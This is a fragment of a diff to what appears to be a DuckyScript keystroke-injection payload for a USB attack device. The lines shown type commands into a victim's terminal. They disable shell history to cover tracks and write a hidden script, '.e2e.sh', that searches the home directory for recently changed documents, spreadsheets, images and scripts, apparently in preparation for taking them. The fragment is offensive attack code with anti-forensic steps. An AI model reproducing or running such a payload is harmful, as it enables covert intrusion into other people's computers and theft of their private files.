@@ -92,7 +92,7 @@ DELAY 300
 REM Unsetting terminal history and building ".e2e.sh":
 STRINGLN unset HISTFILE
 STRINGLN cat > .e2e.sh
-STRINGLN
+STRINGLN_BASH
 file_check() {
     find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | grep -q . 
 }
